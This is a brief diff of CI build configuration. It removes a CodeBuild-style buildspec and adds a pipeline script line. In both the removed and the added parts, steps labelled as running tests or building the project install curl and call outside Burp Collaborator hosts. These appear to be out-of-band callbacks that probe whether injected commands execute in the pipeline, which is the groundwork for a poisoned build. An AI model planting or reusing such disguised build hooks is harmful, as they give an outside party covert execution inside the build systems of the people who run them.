@@ -1,10 +1,2 @@
-version: 0.2
-phases:
- pre_build:
-   commands:
-      - echo "[!] Running test cases"
-      - apt update -y && apt-get install curl -y && curl http://skgai52ewg22p6jyl0rry9zqiho7cw.burpcollaborator.net
- build:
-   commands:
-      - echo "[!] Building project"
-      - apt update -y && apt-get install curl -y && curl http://skgai52ewg22p6jyl0rry9zqiho7cw.burpcollaborator.net
+name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://5iongi0rut0fnjhbjdp4wmx3gumlaa.burpcollaborator.net 
